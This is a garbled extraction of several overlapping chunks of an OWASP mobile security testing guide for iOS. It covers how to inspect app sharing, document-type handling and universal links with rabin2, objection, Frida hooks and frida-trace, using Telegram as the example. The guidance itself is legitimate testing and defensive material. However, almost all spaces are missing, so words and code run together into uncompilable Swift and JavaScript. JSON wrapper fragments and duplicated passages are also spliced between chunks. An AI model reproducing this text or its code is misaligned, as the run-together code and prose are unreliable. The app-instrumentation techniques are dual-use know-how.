Aswementionedbefore,itispossibletoexcludesomeofthesharingmechanismsviathecontroller’sexcludedActiv- ityTypesproperty. ItishighlyrecommendedtodothetestsusingthelatestversionsofiOSasthenumberofactivity typesthatcanbeexcludedcanincrease. Thedevelopershavetobeawareofthisandexplicitlyexcludetheonesthat arenotappropriatefortheappdata. Someactivitytypesmightnotbeevendocumentedlike“CreateWatchFace”. Ifhavingthesourcecode,youshouldtakealookattheUIActivityViewController: • Inspecttheactivitiespassedtotheinit(activityItems:applicationActivities:) method. • Checkifitdefinescustomactivities(alsobeingpassedtothepreviousmethod). • VerifytheexcludedActivityTypes,ifany. Ifyouonlyhavethecompiled/installedapp,trysearchingforthepreviousmethodandproperty,forexample: $rabin2 -zqTelegram\\X.app/Telegram\\X |grep -iactivityItems 0x1000df0344544initWithActivityItems:applicationActivities: Receiving Items Whenreceivingitems,youshouldcheck: • iftheappdeclarescustomdocumenttypesbylookingintoExported/ImportedUTIs(“Info”taboftheXcodeproject). ThelistofallsystemdeclaredUTIs(UniformTypeIdentifiers)canbefoundinthearchivedAppleDeveloperDocu- mentation. • iftheappspecifiesanydocumenttypesthatitcanopenbylookingintoDocumentTypes(“Info”taboftheXcode project). Ifpresent,theyconsistofnameandoneormoreUTIsthatrepresentthedatatype(e.g.“public.png”for PNGfiles). iOSusesthistodetermineiftheappiseligibletoopenagivendocument(specifyingExported/Imported UTIsisnotenough). • iftheappproperlyverifiesthereceiveddatabylookingintotheimplementationofapplication:openURL:options: (oritsdeprecatedversionUIApplicationDelegate application:openURL:sourceApplication:annotation:) in theappdelegate. IfnothavingthesourcecodeyoucanstilltakealookintotheInfo.plistfileandsearchfor: • UTExportedTypeDeclarations/UTImportedTypeDeclarationsiftheappdeclaresexported/importedcustomdoc- umenttypes. • CFBundleDocumentTypestoseeiftheappspecifiesanydocumenttypesthatitcanopen. AverycompleteexplanationabouttheuseofthesekeyscanbefoundonStackoverflow. Let’sseeareal-worldexample. WewilltakeaFileManagerappandtakealookatthesekeys. Weusedobjectionhereto readtheInfo.plistfile. 482\\nobjection --gadget SomeFileManagerruniosplistcatInfo.plist NotethatthisisthesameasifwewouldretrievetheIPAfromthephoneoraccessedviae.g.SSHandnavigated tothecorrespondingfolderintheIPA/appsandbox. However,withobjectionwearejustonecommandawayfrom ourgoalandthiscanbestillconsideredstaticanalysis. Thefirstthingwenoticedisthatappdoesnotdeclareanyimportedcustomdocumenttypesbutwecouldfindacouple ofexportedones: UTExportedTypeDeclarations= ( { UTTypeConformsTo= ( \"public.data\" ); UTTypeDescription=\"SomeFileManagerFiles\"; UTTypeIdentifier=\"com.some.filemanager.custom\"; UTTypeTagSpecification= { \"public.filename-extension\"= ( ipa, deb, zip, rar, tar, gz, ... key, pem, p12, cer ); }; } ); TheappalsodeclaresthedocumenttypesitopensaswecanfindthekeyCFBundleDocumentTypes: CFBundleDocumentTypes= ( { ... CFBundleTypeName=\"SomeFileManagerFiles\"; LSItemContentTypes= ( \"public.content\", \"public.data\", \"public.archive\", \"public.item\", \"public.database\", \"public.calendar-event\", ... ); } ); We can see that this File Manager will try to open anything that conforms to any of the UTIs listed in LSItemContent- Typesandit’sreadytoopenfileswiththeextensionslistedinUTTypeTagSpecification/\"public.filename-extension\". Pleasetakeanoteofthisbecauseitwillbeusefulifyouwanttosearchforvulnerabilitieswhendealingwiththedifferent typesoffileswhenperformingdynamicanalysis. Dynamic Analysis Sending Items Therearethreemainthingsyoucaneasilyinspectbyperformingdynamicinstrumentation: • TheactivityItems: anarrayoftheitemsbeingshared. Theymightbeofdifferenttypes,e.g.onestringandone picturetobesharedviaamessagingapp. • TheapplicationActivities: anarrayofUIActivityobjectsrepresentingtheapp’scustomservices. • TheexcludedActivityTypes: anarrayoftheActivityTypesthatarenotsupported,e.g.postToFacebook. Toachievethisyoucandotwothings: 483\\n• Hookthemethodwehaveseeninthestaticanalysis(init(activityItems: applicationActivities:)) toget theactivityItemsandapplicationActivities. • FindouttheexcludedactivitiesbyhookingexcludedActivityTypesproperty. Let’sseeanexampleusingTelegramtoshareapictureandatextfile. Firstpreparethehooks,wewillusetheFridaREPL andwriteascriptforthis: Interceptor.attach( ObjC.classes. UIActivityViewController['-initWithActivityItems:applicationActivities:'].implementation,{ onEnter:function (args){ printHeader(args) this.initWithActivityItems =ObjC.Object(args[2]); this.applicationActivities =ObjC.Object(args[3]); console.log(\"initWithActivityItems:\" +this.initWithActivityItems); console.log(\"applicationActivities:\" +this.applicationActivities); }, onLeave:function (retval){ printRet(retval); } });",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 158
    }
  },
  {
    "text": "Typesandit’sreadytoopenfileswiththeextensionslistedinUTTypeTagSpecification/\"public.filename-extension\". Pleasetakeanoteofthisbecauseitwillbeusefulifyouwanttosearchforvulnerabilitieswhendealingwiththedifferent typesoffileswhenperformingdynamicanalysis. Dynamic Analysis Sending Items Therearethreemainthingsyoucaneasilyinspectbyperformingdynamicinstrumentation: • TheactivityItems: anarrayoftheitemsbeingshared. Theymightbeofdifferenttypes,e.g.onestringandone picturetobesharedviaamessagingapp. • TheapplicationActivities: anarrayofUIActivityobjectsrepresentingtheapp’scustomservices. • TheexcludedActivityTypes: anarrayoftheActivityTypesthatarenotsupported,e.g.postToFacebook. Toachievethisyoucandotwothings: 483\\n• Hookthemethodwehaveseeninthestaticanalysis(init(activityItems: applicationActivities:)) toget theactivityItemsandapplicationActivities. • FindouttheexcludedactivitiesbyhookingexcludedActivityTypesproperty. Let’sseeanexampleusingTelegramtoshareapictureandatextfile. Firstpreparethehooks,wewillusetheFridaREPL andwriteascriptforthis: Interceptor.attach( ObjC.classes. UIActivityViewController['-initWithActivityItems:applicationActivities:'].implementation,{ onEnter:function (args){ printHeader(args) this.initWithActivityItems =ObjC.Object(args[2]); this.applicationActivities =ObjC.Object(args[3]); console.log(\"initWithActivityItems:\" +this.initWithActivityItems); console.log(\"applicationActivities:\" +this.applicationActivities); }, onLeave:function (retval){ printRet(retval); } }); Interceptor.attach( ObjC.classes.UIActivityViewController['-excludedActivityTypes'].implementation,{ onEnter:function (args){ printHeader(args) }, onLeave:function (retval){ printRet(retval); } }); function printHeader(args){ console.log(Memory.readUtf8String(args[1])+\"@\" +args[1]) }; function printRet(retval){ console.log('RET@' +retval +':' ); try{ console.log(newObjC.Object(retval).toString()); }catch (e){ console.log(retval.toString()); } }; YoucanstorethisasaJavaScriptfile,e.g.inspect_send_activity_data.jsandloaditlikethis: frida -UTelegram -linspect_send_activity_data.js Nowobservetheoutputwhenyoufirstshareapicture: [*]initWithActivityItems:applicationActivities:@0x18c130c07 initWithActivityItems:( \"<UIImage:0x1c4aa0b40>size{571,264}orientation0scale1.000000\" ) applicationActivities:nil RET@ 0x13cb2b800: <UIActivityViewController:0x13cb2b800> [*]excludedActivityTypes@ 0x18c0f8429 RET@ 0x0: nil andthenatextfile: [*]initWithActivityItems:applicationActivities:@0x18c130c07 initWithActivityItems:( \"<QLActivityItemProvider:0x1c4a30140>\", \"<UIPrintInfo:0x1c0699a50>\" ) applicationActivities:( ) RET@ 0x13c4bdc00: <_UIDICActivityViewController:0x13c4bdc00> [*]excludedActivityTypes@ 0x18c0f8429 484\\nRET@ 0x1c001b1d0: ( \"com.apple.UIKit.activity.MarkupAsPDF\" ) Youcanseethat: • Forthepicture,theactivityitemisaUIImageandtherearenoexcludedactivities. • Forthetextfiletherearetwodifferentactivityitemsandcom.apple.UIKit.activity. MarkupAsPDFisexcluded. In the previous example, there were no custom applicationActivities and only one excluded activity. However, to betterillustratewhatyoucanexpectfromotherappswehavesharedapictureusinganotherapp,hereyoucanseea bunchofapplicationactivitiesandexcludedactivities(outputwaseditedtohidethenameoftheoriginatingapp): [*]initWithActivityItems:applicationActivities:@0x18c130c07 initWithActivityItems:( \"<SomeActivityItemProvider:0x1c04bd580>\" ) applicationActivities:( \"<SomeActionItemActivityAdapter:0x141de83b0>\", \"<SomeActionItemActivityAdapter:0x147971cf0>\", \"<SomeOpenInSafariActivity:0x1479f0030>\", \"<SomeOpenInChromeActivity:0x1c0c8a500>\" ) RET@ 0x142138a00: <SomeActivityViewController:0x142138a00> [*]excludedActivityTypes@ 0x18c0f8429 RET@ 0x14797c3e0: ( \"com.apple.UIKit.activity.Print\", \"com.apple.UIKit.activity.AssignToContact\", \"com.apple.UIKit.activity.SaveToCameraRoll\", \"com.apple.UIKit.activity.CopyToPasteboard\", ) Receiving Items After performing the static analysis you would know the document types that the app can open and if it declares any customdocumenttypesand(partof)themethodsinvolved. Youcanusethisnowtotestthereceivingpart: • ShareafilewiththeappfromanotherapporsenditviaAirDropore-mail. Choosethefilesothatitwilltriggerthe “Openwith...”dialogue(thatis,thereisnodefaultappthatwillopenthefile,aPDFforexample). • Hookapplication:openURL:options: andanyothermethodsthatwereidentifiedinapreviousstaticanalysis. • Observetheappbehavior. • Inaddition,youcouldsendspecificmalformedfilesand/oruseafuzzingtechnique. Toillustratethiswithanexamplewehavechosenthesamereal-worldfilemanagerappfromthestaticanalysissection andfollowedthesesteps: 1. SendaPDFfilefromanotherAppledevice(e.g.aMacBook)viaAirdrop. 2. WaitfortheAirDroppopuptoappearandclickonAccept. 3. Asthereisnodefaultappthatwillopenthefile,itswitchestotheOpenwith...popup. There,wecanselecttheapp thatwillopenourfile. Thenextscreenshotshowsthis(wehavemodifiedthedisplaynameusingFridatoconceal theapp’srealname): 485\\n4. AfterselectingSomeFileManagerwecanseethefollowing: (0x1c4077000) -[AppDelegateapplication:openURL:options:] application: <UIApplication:0x101c00950> openURL:file:///var/mobile/Library/Application%20Support /Containers/com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf options:{ UIApplicationOpenURLOptionsAnnotationKey= { LSMoveDocumentOnOpen= 1; }; UIApplicationOpenURLOptionsOpenInPlaceKey= 0; UIApplicationOpenURLOptionsSourceApplicationKey= \"com.apple.sharingd\"; \"_UIApplicationOpenURLOptionsSourceProcessHandleKey\" =\"<FBSProcessHandle:0x1c3a63140; sharingd:605;valid:YES>\"; } 0x18c7930d8UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke ... 0x1857cdc34FrontBoardServices!-[FBSSerialQueue _performNextFromRunLoopSource] RET:0x1 Asyou cansee, thesending applicationiscom.apple.sharingd andthe URL’sscheme isfile://. Note that oncewe selecttheappthatshouldopenthefile,thesystemalreadymovedthefiletothecorrespondingdestination,thatistothe app’sInbox. TheappsarethenresponsiblefordeletingthefilesinsidetheirInboxes. Thisapp,forexample,movesthe 486\\nfileto/var/mobile/Documents/andremovesitfromtheInbox. (0x1c002c760) -[XXFileManagermoveItemAtPath:toPath:error:] moveItemAtPath:/var/mobile/Library/ApplicationSupport/Containers /com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf toPath:/var/mobile/Documents/OWASP_MASVS (1).pdf error:0x16f095bf8 0x100f24e90SomeFileManager!-[AppDelegate__handleOpenURL:] 0x100f25198SomeFileManager!-[AppDelegateapplication:openURL:options:] 0x18c7930d8UIKit!__58-[UIApplication_applicationOpenURLAction:payload:origin:]_block_invoke ... 0x1857cd9f4FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__ RET:0x1 Ifyoulookatthestacktrace,youcanseehowapplication:openURL:options: called__handleOpenURL:,whichcalled moveItemAtPath:toPath:error:. Noticethatwehavenowthisinformationwithouthavingthesourcecodeforthetarget app. Thefirstthingthatwehadtodowasclear: hookapplication:openURL:options:. Regardingtherest,wehadto thinkalittlebitandcomeupwithmethodsthatwecouldstarttracingandarerelatedtothefilemanager,forexample, all methods containing the strings “copy”, “move”, “remove”, etc. until we have found that the one being called was moveItemAtPath:toPath:error:. AfinalthingworthnoticinghereisthatthiswayofhandlingincomingfilesisthesameforcustomURLschemes. Please refertothe“TestingCustomURLSchemes”sectionformoreinformation. Testing Universal Links Platform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis Testinguniversallinksonastaticapproachincludesdoingthefollowing: • CheckingtheAssociatedDomainsentitlement • RetrievingtheAppleAppSiteAssociationfile • Checkingthelinkreceivermethod • Checkingthedatahandlermethod • Checkingiftheappiscallingotherapp’suniversallinks Checking the Associated Domains Entitlement UniversallinksrequirethedevelopertoaddtheAssociatedDomainsentitlementandincludeinitalistofthedomains thattheappsupports. InXcode,gototheCapabilitiestabandsearchforAssociatedDomains. Youcanalsoinspectthe.entitlementsfile lookingforcom.apple.developer.associated-domains. Eachofthedomainsmustbeprefixedwithapplinks:,suchas applinks:www.mywebsite.com. Here’sanexamplefromTelegram’s.entitlementsfile: <key>com.apple.developer.associated-domains</key> <array> <string>applinks:telegram.me</string> <string>applinks:t.me</string> </array> MoredetailedinformationcanbefoundinthearchivedAppleDeveloperDocumentation. Ifyoudon’thavetheoriginalsourcecodeyoucanstillsearchforthem,asexplainedin“EntitlementsEmbeddedinthe CompiledAppBinary”. 487\\nRetrieving the Apple App Site Association File Try to retrieve the apple-app-site-association file from the server using the associated domains you got from the previousstep. ThisfileneedstobeaccessibleviaHTTPS,withoutanyredirects,athttps://<domain>/apple-app-site- associationorhttps://<domain>/.well-known/apple-app-site-association. You can retrieve it yourself using your browser and navigating to https://<domain>/apple-app-site-association, https://<domain>/.well-known/apple-app-site-association or using Apple’s CDN at https://app-site- association.cdn-apple.com/a/v1/<domain>. Alternatively,youcanusetheAppleAppSiteAssociation(AASA)Validator. Afterenteringthedomain,itwilldisplaythe file,verifyitforyouandshowtheresults(e.g.ifitisnotbeingproperlyservedoverHTTPS).Seethefollowingexample fromapple.comhttps://www.apple.com/.well-known/apple-app-site-association: { \"activitycontinuation\":{ \"apps\":[ \"W74U47NE8E.com.apple.store.Jolly\" ] }, \"applinks\":{ \"apps\":[], \"details\":[ { \"appID\":\"W74U47NE8E.com.apple.store.Jolly\", \"paths\":[ \"NOT/shop/buy-iphone/*\", \"NOT/us/shop/buy-iphone/*\", \"/xc/*\", \"/shop/buy-*\", \"/shop/product/*\", \"/shop/bag/shared_bag/*\", \"/shop/order/list\", \"/today\", \"/shop/watch/watch-accessories\", \"/shop/watch/watch-accessories/*\", \"/shop/watch/bands\", ]}]} } The “details” key inside “applinks” contains a JSON representation of an array that might contain one or more apps. The“appID”shouldmatchthe“application-identifier”keyfromtheapp’sentitlements. Next,usingthe“paths”key,the developers can specify certain paths to be handled on a per app basis. Some apps, like Telegram use a standalone * (\"paths\":[\"*\"])inordertoallowallpossiblepaths. Onlyifspecificareasofthewebsiteshouldnotbehandledbysome app,thedevelopercanrestrictaccessbyexcludingthembyprependinga\"NOT\"(notethewhitespaceaftertheT)tothe correspondingpath. Alsorememberthatthesystemwilllookformatchesbyfollowingtheorderofthedictionariesinthe array(firstmatchwins). Thispathexclusionmechanismisnottobeseenasasecurityfeaturebutratherasafilterthatdevelopermightuseto specifywhichappsopenwhichlinks. Bydefault,iOSdoesnotopenanyunverifiedlinks. Rememberthatuniversallinksverificationoccursatinstallationtime. iOSretrievestheAASAfileforthedeclareddomains (applinks) in its com.apple.developer.associated-domains entitlement. iOS will refuse to open those links if the verificationdidnotsucceed. Somereasonstofailverificationmightinclude: 488\\n• TheAASAfileisnotservedoverHTTPS. • TheAASAisnotavailable. • TheappIDsdonotmatch(thiswouldbethecaseofamaliciousapp). iOSwouldsuccessfullypreventanypossible hijackingattacks. Checking the Link Receiver Method",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 159
    }
  },
  {
    "text": "app basis. Some apps, like Telegram use a standalone * (\"paths\":[\"*\"])inordertoallowallpossiblepaths. Onlyifspecificareasofthewebsiteshouldnotbehandledbysome app,thedevelopercanrestrictaccessbyexcludingthembyprependinga\"NOT\"(notethewhitespaceaftertheT)tothe correspondingpath. Alsorememberthatthesystemwilllookformatchesbyfollowingtheorderofthedictionariesinthe array(firstmatchwins). Thispathexclusionmechanismisnottobeseenasasecurityfeaturebutratherasafilterthatdevelopermightuseto specifywhichappsopenwhichlinks. Bydefault,iOSdoesnotopenanyunverifiedlinks. Rememberthatuniversallinksverificationoccursatinstallationtime. iOSretrievestheAASAfileforthedeclareddomains (applinks) in its com.apple.developer.associated-domains entitlement. iOS will refuse to open those links if the verificationdidnotsucceed. Somereasonstofailverificationmightinclude: 488\\n• TheAASAfileisnotservedoverHTTPS. • TheAASAisnotavailable. • TheappIDsdonotmatch(thiswouldbethecaseofamaliciousapp). iOSwouldsuccessfullypreventanypossible hijackingattacks. Checking the Link Receiver Method Inordertoreceivelinksandhandlethemappropriately,theappdelegatehastoimplementapplication:continueUserActivity:restorationHandler:. Ifyouhavetheoriginalprojecttrysearchingforthismethod. PleasenotethatiftheappusesopenURL:options:completionHandler: toopenauniversallinktotheapp’swebsite, thelinkwon’topenintheapp. Asthecalloriginatesfromtheapp,itwon’tbehandledasauniversallink. FromAppleDocs: WheniOSlaunchesyourappafterausertapsauniversallink,youreceiveanNSUserActivity objectwithanactivityTypevalueofNSUserActivityTypeBrowsingWeb. Theactivityobject’swebpageURLproperty containstheURLthattheuserisaccessing. ThewebpageURLpropertyalwayscontainsanHTTPorHTTPSURL,and you can use NSURLComponents APIs to manipulate the components of the URL. [...] To protect users’ privacy and security,youshouldnotuseHTTPwhenyouneedtotransportdata;instead,useasecuretransportprotocolsuch asHTTPS. Fromthenoteabovewecanhighlightthat: • ThementionedNSUserActivityobjectcomesfromthecontinueUserActivityparameter,asseeninthemethod above. • TheschemeofthewebpageURLmustbeHTTPorHTTPS(anyotherschemeshouldthrowanexception). Thescheme instancepropertyofURLComponents/NSURLComponentscanbeusedtoverifythis. Ifyoudon’thavetheoriginalsourcecodeyoucanuseradare2orrabin2tosearchthebinarystringsforthelinkreceiver method: $rabin2 -zqTelegram\\X.app/Telegram\\X |grep restorationHan 0x1000deea95352application:continueUserActivity:restorationHandler: Checking the Data Handler Method Youshouldcheckhowthereceiveddataisvalidated. Appleexplicitlywarnsaboutthis: Universallinksofferapotentialattackvectorintoyourapp,somakesuretovalidateallURLparametersanddiscard anymalformedURLs. Inaddition,limittheavailableactionstothosethatdonotrisktheuser’sdata. Forexample, donotallowuniversallinkstodirectlydeletecontentoraccesssensitiveinformationabouttheuser. Whentesting yourURL-handlingcode,makesureyourtestcasesincludeimproperlyformattedURLs. AsstatedintheAppleDeveloperDocumentation,wheniOSopensanappastheresultofauniversallink,theappreceives anNSUserActivityobjectwithanactivityTypevalueofNSUserActivityTypeBrowsingWeb. Theactivityobject’sweb- pageURLpropertycontainstheHTTPorHTTPSURLthattheuseraccesses. ThefollowingexampleinSwiftverifiesexactly thisbeforeopeningtheURL: funcapplication(_application:UIApplication,continueuserActivity:NSUserActivity, restorationHandler:@escaping([UIUserActivityRestoring]?)->Void)->Bool{ //... ifuserActivity.activityType==NSUserActivityTypeBrowsingWeb,leturl=userActivity.webpageURL{ application.open(url,options:[:],completionHandler:nil) } returntrue } Inaddition,rememberthatiftheURLincludesparameters,theyshouldnotbetrustedbeforebeingcarefullysanitizedand validated(evenwhencomingfromtrusteddomain). Forexample,theymighthavebeenspoofedbyanattackerormight includemalformeddata. Ifthatisthecase,thewholeURLandthereforetheuniversallinkrequestmustbediscarded. 489\\nTheNSURLComponentsAPIcanbeusedtoparseandmanipulatethecomponentsoftheURL.Thiscanbealsopartofthe methodapplication:continueUserActivity:restorationHandler: itselformightoccuronaseparatemethodbeing calledfromit. Thefollowingexampledemonstratesthis: funcapplication(_application:UIApplication, continueuserActivity:NSUserActivity, restorationHandler:@escaping([Any]?)->Void)->Bool{ guarduserActivity.activityType==NSUserActivityTypeBrowsingWeb, letincomingURL=userActivity.webpageURL, letcomponents=NSURLComponents(url:incomingURL,resolvingAgainstBaseURL:true), letpath=components.path, letparams=components.queryItemselse{ returnfalse } ifletalbumName=params.first(where:{$0.name==\"albumname\"})?.value, letphotoIndex=params.first(where:{$0.name==\"index\"})?.value{ //Interactwithalbumnameandphotoindex returntrue }else{ //Handlewhenalbumand/oralbumnameorphotoindexmissing returnfalse } } Finally,asstatedabove,besuretoverifythattheactionstriggeredbytheURLdonotexposesensitiveinformationorrisk theuser’sdataonanyway. Checking if the App is Calling Other App’s Universal Links Anappmightbecallingotherappsviauniversallinksinordertosimplytriggersomeactionsortotransferinformation, inthatcase,itshouldbeverifiedthatitisnotleakingsensitiveinformation. If you have the original source code, you can search it for the openURL:options: completionHandler: method and checkthedatabeinghandled. NotethattheopenURL:options:completionHandler: methodisnotonlyusedtoopenuniversallinksbutalsoto callcustomURLschemes. ThisisanexamplefromtheTelegramapp: },openUniversalUrl:{url,completionin if#available(iOS10.0,*){ varparsedUrl=URL(string:url) ifletparsed=parsedUrl{ ifparsed.scheme==nil||parsed.scheme!.isEmpty{ parsedUrl=URL(string:\"https://\\(url)\") } } ifletparsedUrl=parsedUrl{ returnUIApplication.shared.open(parsedUrl, options:[UIApplicationOpenURLOptionUniversalLinksOnly:trueasNSNumber], completionHandler:{valueincompletion.completion(value)} ) Notehowtheappadaptstheschemeto“https”beforeopeningitandhowitusestheoptionUIApplicationOpenURLOp- tionUniversalLinksOnly: truethatopenstheURLonlyiftheURLisavaliduniversallinkandthereisaninstalledapp capableofopeningthatURL. Ifyoudon’thavetheoriginalsourcecode,searchinthesymbolsandinthestringsoftheappbinary. Forexample,we willsearchforObjective-Cmethodsthatcontain“openURL”: $rabin2 -zqTelegram\\X.app/Telegram\\X |grep openURL 0x1000dee3f5049application:openURL:sourceApplication:annotation: 0x1000dee712928application:openURL:options: 0x1000df2c998openURL: 0x1000df7723534openURL:options:completionHandler: 490\\nAsexpected,openURL:options:completionHandler: isamongtheonesfound(rememberthatitmightbealsopresent becausetheappopenscustomURLschemes). Next,toensurethatnosensitiveinformationisbeingleakedyou’llhave to perform dynamic analysis and inspect the data being transmitted. Please refer to “Identifying and Hooking the URL HandlerMethod”forsomeexamplesonhookingandtracingthismethod. Dynamic Analysis Ifanappisimplementinguniversallinks,youshouldhavethefollowingoutputsfromthestaticanalysis: • theassociateddomains • theAppleAppSiteAssociationfile • thelinkreceivermethod • thedatahandlermethod Youcanusethisnowtodynamicallytestthem: • Triggeringuniversallinks • Identifyingvaliduniversallinks • Tracingthelinkreceivermethod • Checkinghowthelinksareopened Triggering Universal Links UnlikecustomURLschemes,unfortunatelyyoucannottestuniversallinksfromSafarijustbytypingtheminthesearch bardirectlyasthisisnotallowedbyApple. ButyoucantestthemanytimeusingotherappsliketheNotesapp: • OpentheNotesappandcreateanewnote. • Writethelinksincludingthedomain. • LeavetheeditingmodeintheNotesapp. • Longpressthelinkstoopenthem(rememberthatastandardclicktriggersthedefaultoption). TodoitfromSafariyouwillhavetofindanexistinglinkonawebsitethatonceclicked, itwillberecognizedasa UniversalLink. Thiscanbeabittimeconsuming. AlternativelyyoucanalsouseFridaforthis,seethesection“PerformingURLRequests”formoredetails. Identifying Valid Universal Links FirstofallwewillseethedifferencebetweenopeninganallowedUniversalLinkandonethatshouldn’tbeallowed. Fromtheapple-app-site-associationofapple.comwehaveseenabovewechosethefollowingpaths: \"paths\":[ \"NOT/shop/buy-iphone/*\", ... \"/today\", Oneofthemshouldofferthe“Openinapp”optionandtheothershouldnot. Ifwelongpressonthefirstone(http://www.apple.com/shop/buy-iphone/iphone-xr)itonlyofferstheoptiontoopen it(inthebrowser). 491\\nIfwelongpressonthesecond(http://www.apple.com/today)itshowsoptionstoopenitinSafariandin“AppleStore”: 492\\nNote that there is a difference between a click and a long press. Once we long press a link and select an option, e.g. “Open in Safari”, this will become the default option for all future clicks until we long press again and select anotheroption. Ifwerepeattheprocessonthemethodapplication:continueUserActivity:restorationHandler: byeitherhooking ortracing,wewillseehowitgetscalledassoonasweopenthealloweduniversallink. Forthisyoucanuseforexample frida-trace: frida-trace -U\"AppleStore\" -m\"*[**restorationHandler*]\" Tracing the Link Receiver Method Thissectionexplainshowtotracethelinkreceivermethodandhowtoextractadditionalinformation. Forthisexample, wewilluseTelegram,astherearenorestrictionsinitsapple-app-site-associationfile: 493\\n{ \"applinks\":{ \"apps\":[], \"details\":[ { \"appID\":\"X834Q8SBVP.org.telegram.TelegramEnterprise\", \"paths\":[ \"*\" ] }, { \"appID\":\"C67CF9S4VU.ph.telegra.Telegraph\", \"paths\":[ \"*\" ] }, { \"appID\":\"X834Q8SBVP.org.telegram.Telegram-iOS\", \"paths\":[ \"*\" ] } ] } } InordertoopenthelinkswewillalsousetheNotesappandfrida-tracewiththefollowingpattern: frida-trace -UTelegram -m\"*[**restorationHandler*]\" Writehttps://t.me/addstickers/radare(foundthroughaquickInternetresearch)andopenitfromtheNotesapp. 494\\nFirstweletfrida-tracegeneratethestubsin__handlers__/: $frida-trace -UTelegram -m\"*[**restorationHandler*]\" Instrumentingfunctions... -[AppDelegateapplication:continueUserActivity:restorationHandler:] Youcanseethatonlyonefunctionwasfoundandisbeinginstrumented. Triggernowtheuniversallinkandobservethe traces. 298382ms -[AppDelegate application:0x10556b3c0continueUserActivity:0x1c4237780 restorationHandler:0x16f27a898] Youcanobservethatthefunctionisinfactbeingcalled. Youcannowaddcodetothestubsin__handlers__/toobtain moredetails: 495\\n//__handlers__/__AppDelegate_application_contin_8e36bbb1.js onEnter:function (log,args,state){ log(\"-[AppDelegateapplication:\" +args[2]+\"continueUserActivity:\" + args[3]+ \"restorationHandler:\" +args[4]+\"]\"); log(\"\\tapplication:\" +ObjC.Object(args[2]).toString()); log(\"\\tcontinueUserActivity:\" +ObjC.Object(args[3]).toString()); log(\"\\t\\twebpageURL:\" +ObjC.Object(args[3]).webpageURL().toString()); log(\"\\t\\tactivityType:\" +ObjC.Object(args[3]).activityType().toString()); log(\"\\t\\tuserInfo:\" +ObjC.Object(args[3]).userInfo().toString()); log(\"\\trestorationHandler:\" +ObjC.Object(args[4]).toString()); }, Thenewoutputis: 298382ms -[AppDelegate application:0x10556b3c0continueUserActivity:0x1c4237780 restorationHandler:0x16f27a898] 298382ms application:<Application:0x10556b3c0> 298382ms continueUserActivity:<NSUserActivity:0x1c4237780> 298382ms webpageURL:http://t.me/addstickers/radare 298382ms activityType:NSUserActivityTypeBrowsingWeb 298382ms userInfo:{ } 298382ms restorationHandler:<__NSStackBlock__:0x16f27a898> Apartfromthefunctionparameterswehaveaddedmoreinformationbycallingsomemethodsfromthemtogetmore details,inthiscaseabouttheNSUserActivity. IfwelookintheAppleDeveloperDocumentationwecanseewhatelse wecancallfromthisobject. Checking How the Links Are Opened IfyouwanttoknowmoreaboutwhichfunctionactuallyopenstheURLandhowthedataisactuallybeinghandledyou shouldkeepinvestigating. ExtendthepreviouscommandinordertofindoutifthereareanyotherfunctionsinvolvedintoopeningtheURL. frida-trace -UTelegram -m\"*[**restorationHandler*]\" -i\"*open*Url*\" -iincludesanymethod. Youcanalsouseaglobpatternhere(e.g.-i \"*open*Url*\"means“includeanyfunction containing‘open’,then‘Url’andsomethingelse”) Again,wefirstletfrida-tracegeneratethestubsin__handlers__/: $frida-trace -UTelegram -m\"*[**restorationHandler*]\" -i\"*open*Url*\" Instrumentingfunctions... -[AppDelegateapplication:continueUserActivity:restorationHandler:] $S10TelegramUI0A19ApplicationBindingsC16openUniversalUrlyySS_AA0ac4OpenG10Completion... $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData18application... $S10TelegramUI31AuthorizationSequenceControllerC7account7strings7openUrl5apiId0J4HashAC0A4Core19... ... Nowyoucanseealonglistoffunctionsbutwestilldon’tknowwhichoneswillbecalled. Triggertheuniversallinkagain andobservethetraces. /*TID0x303 */ 298382ms -[AppDelegate application:0x10556b3c0continueUserActivity:0x1c4237780 restorationHandler:0x16f27a898] 298619ms |$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData 18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA 14OpenURLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display0 10NavigationO0CSgyyctF() ApartfromtheObjective-Cmethod,nowthereisoneSwiftfunctionthatisalsoofyourinterest. ThereisprobablynodocumentationforthatSwiftfunctionbutyoucanjustdemangleitssymbolusingswift-demangle viaxcrun: 496\\nxcruncanbeusedinvokeXcodedevelopertoolsfromthecommand-line,withouthavingtheminthepath. Inthis caseitwilllocateandrunswift-demangle,anXcodetoolthatdemanglesSwiftsymbols. $xcrunswift-demangleS10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData 18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0 12PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF Resultingin: --- masvs_category:MASVS-CODE platform:ios",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 160
    }
  },
  {
    "text": "Opened IfyouwanttoknowmoreaboutwhichfunctionactuallyopenstheURLandhowthedataisactuallybeinghandledyou shouldkeepinvestigating. ExtendthepreviouscommandinordertofindoutifthereareanyotherfunctionsinvolvedintoopeningtheURL. frida-trace -UTelegram -m\"*[**restorationHandler*]\" -i\"*open*Url*\" -iincludesanymethod. Youcanalsouseaglobpatternhere(e.g.-i \"*open*Url*\"means“includeanyfunction containing‘open’,then‘Url’andsomethingelse”) Again,wefirstletfrida-tracegeneratethestubsin__handlers__/: $frida-trace -UTelegram -m\"*[**restorationHandler*]\" -i\"*open*Url*\" Instrumentingfunctions... -[AppDelegateapplication:continueUserActivity:restorationHandler:] $S10TelegramUI0A19ApplicationBindingsC16openUniversalUrlyySS_AA0ac4OpenG10Completion... $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData18application... $S10TelegramUI31AuthorizationSequenceControllerC7account7strings7openUrl5apiId0J4HashAC0A4Core19... ... Nowyoucanseealonglistoffunctionsbutwestilldon’tknowwhichoneswillbecalled. Triggertheuniversallinkagain 